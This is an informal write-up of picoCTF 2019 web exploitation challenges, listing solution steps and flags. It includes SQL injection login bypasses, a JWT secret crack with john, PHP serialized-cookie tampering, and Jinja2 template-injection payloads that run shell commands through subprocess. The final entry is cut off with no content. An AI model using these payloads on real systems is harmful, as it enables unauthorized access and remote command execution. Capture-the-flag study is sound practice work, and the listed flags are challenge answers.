

PICO CTF-2019
------------------------------------------

Web Exploitation:-

1. Insp3ct0r

> simple look for > What and How?
> now you got to look for source code here you get half flag that is 1/3
$ picoCTF{tru3_d3
> now look for mycss.css you get 2/3 flag
$ t3ct1ve_0r_ju5t
> now look for myjs.js you get 3/3 flag
$ _lucky?2717d7be}

finally concat all string and the flag is
> picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?2717d7be}



2. dont-use-client-side

look for source code rearrage the strings of flag in sequence.

> picoCTF{no_clients_plz_577431}



3. logon - Points

Simply login with any user without password and look for cookies you will see a admin:False
make it admin:Ture and you get a flag

> picoCTF{th3_c0nsp1r4cy_l1v3s_95e4b2d5}


4. where are the robots

look for robots.txt > you will get 8e32f.html > open it and you will get flag

>  picoCTF{ca1cu1at1ng_Mach1n3s_8e32f}


5.  Client-side-again

now again look first for soucre code again you get JS code.
now here you need to do beutify the js code, google it : js beautify
//   var _0x5a46=['0a0d8}','_again_4','this','Password\x20Verified','Incorrect\x20password','getElementById','value','substring','picoCTF{','not_this']
rearrange it in sequence and get the flag

> picoCTF{not_this_again_40a0d8}


6. Open-to-admins

this was easiest one here all you need to do is use > edit_this_cookie extension and add two
paramters 1. admin: True 2. time:1400
 > click on Flag and you get flag.

> picoCTF{0p3n_t0_adm1n5_42e59862}



7. picobrowser

Click on flag burpsuite and Intercept on burpsuite and now replace the User-agent header with "picobrowser"
and send the request and you get the flag

> picoCTF{p1c0_s3cr3t_ag3nt_b3785d03}


8. Irish-Name-Repo 1

goal is to get logged in as admin, now give below payload in username and any value as password
admin'--   and you get flag.

> picoCTF{s0m3_SQL_34865514}


9. Irish-Name-Repo 2

go to admin login > simply give a payload admin'-- as username and password anything

> picoCTF{m0R3_SQL_plz_3693681d}


10. Empire1

here you need to create account and once you are done, login and see if there is any SQL injection available
after some time got to know there is something wrong in the add list option> giving single quotes gives a error,
now simple fire following payload and her you get flag
 // payload - '||(select group_concat(secret) from user)||'

> picoCTF{wh00t_it_a_sql_injectdf389592}


11. Irish-Name-Repo 3

your goal is to login into acccount but here only password is asked no user name, lets give single quote(')
we get a error but not on screen, Intercept the request in burpsuite and send
'OR'1'='1 but you will noting so see in request you need to make debug=1 and here see OR is predent as BE
so make query as 'BE'1'='1

>  picoCTF{3v3n_m0r3_SQL_a9766759}


12. JaWT Scratchpad

	a) steps to follow is important in this challenge
	   enter any name and login into application Jawt
	b) look for cookies and and just decode the JWT (JSON WEB ACCESS TOKEN) using jwt.into
	c) now you got to know we need to replace the username with admin name and
	   we need signiture key to make a valid token of admin
	d) we use john tool for that we first need to convert JWT token so that we can use it in john tool
	   > download git clone https://github.com/Sjord/jwtcrack
	e) fire $ python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdGluZyJ9.1JKgvkN3_VwmprS_y6oEsZu8WRJPdCSRrqlzCF0WYXM > jwt.john

	f) $john jwt.john --wordlist=/usr/share/wordlists/rockyou.txt

	e) you get signiture key as "ilovepico"
	f) encode "admin" jwt with "ilovepico" signiture and use it as cookie for JWT and you get flag

> picoCTF{jawt_was_just_what_you_thought_9ed4519dee8140de7a186a5df5a08d6e}


13. Java Script Kiddie 1


(Note:- I am still confused in this so need some time to write whole properly but you can refer this will help to solve the challenge)
this challenge is really a challenge for this i would like to thank @radekk for his writeup
	> https://medium.com/@radekk/picoctf-2019-writeup-for-js-kiddie-7af4f0a20838


	1. the ultimate goal here is to get a key that too valid one so that we can get a correct PNG.

	2. looking at JS code and understand it was a difficult task for me so i will recommend you all to follow the
	blog which i attached.

	3. now when you reload the tab and look for network traffic you will get to know
	there is one endpoint /bytes sending some bytes now simply copy those bytes and make paste in below exploit

	> https://gist.github.com/radekk/54583a1f6ca2f6a5f234578f659cb944#file-pico-ctf-jskiddie1-html

	and you get a QR code

	4. now decode that QR code with https://zxing.org/w/decode.jspx and you get the flag

> picoCTF{cad9a05f668a0c9d2543a9867a998cbd}


14. Java Script Kiddie 2 (Same blog as above to follow)
	
	refer the same blog of Java Script Kiddie 1 ~ #

	The length of key variable is not 16 but 32 characters:
	var key = "00000000000000000000000000000000";

	The shifter value formula is different than in the first one:
	shifter = Number(key.slice((i*2),(i*2)+1));

	What it does it uses every second byte from the key as actual key.
	It means that even though we have 32 characters, only 16 are being used.

	use the script you get the following results

	5760175061093003: 5760175061193003: 5760175062093003: 5760175062193003:

	here atlast after script we need to add addtional characters to make a 32 bit key

	> 5a7a6a0a1a7a5a0a6a1a0a9a3a0a0a3a

	> you got  QR code with https://zxing.org/w/decode.jspx and you get the flag

> picoCTF{b19be0d3b70ffc63b6367ecf136e853e}


15. Empire2

in this level there is "ServerSideTemplateInjection"
: PAYLOADS you need to use here

> {{2+2}}
> {{config}}
> {{session}}
> {{request}}
> {{request.environ}}
> {{[].__class__.__mro__[1].__subclasses__()}}
> {{[].__class__.__mro__[1].__subclasses__()[287]}}
> {{[].__class__.__mro__[1].__subclasses__()[287]("id", stdout=-1).communicate()}}
> {{[].__class__.__mro__[1].__subclasses__()[287]("pwd".split(), stdout=-1).communicate()}}
> {{[].__class__.__mro__[1].__subclasses__()[287]("ls -la".split(), stdout=-1).communicate()}}
> {{[].__class__.__mro__[1].__subclasses__()[287]("ls -la app".split(), stdout=-1).communicate()}}
> {{[].__class__.__mro__[1].__subclasses__()[287]("grep -r picoCTF", shell=1, stdout=-1, stderr=-1).communicate()}}


The last payload will execute an command for grep CTF flag

> picoCTF{its_a_me_your_flag3f43252e}



16. cereal hacker 1

 a) After a lot tries we finally got to know that there is a user by default with guest:guest
	> now all you need to do is to look for cookies decode it base64

 	user_info : TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D
 	you get :-  O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}

 b) replace guest with admin and make it base64 again but it will not work, now all you need to do is to make a SQL injection payload

 c) admin' OR '1' = '1

	O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:18:"admin' OR '1' = '1";}

	(The word s:5we converted to s:18due to our payload contains 18 characters.
		Now encode base64 and put it back in and see the results)

	now make it base64 and set it as user_info cookie before that make sure to make index.php?file=admin

	user_info : TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MTg6ImFkbWluJyBPUiAnMScgPSAnMSI7fQ==

	now her you get the flag

> picoCTF{71411d2f10372bccbdd499087b24084e}



17. Empire3

as we learned from Empire2 about SSTI we can use same payload to grep picoCTF Flag,
> {{[].__class__.__mro__[1].__subclasses__()[287]("grep -r picoCTF", shell=1, stdout=-1, stderr=-1).communicate()}}

here we got the flag
> picoCTF{cookies_are_a_sometimes_food_ca3aaf8b}



18. cereal hacker 2
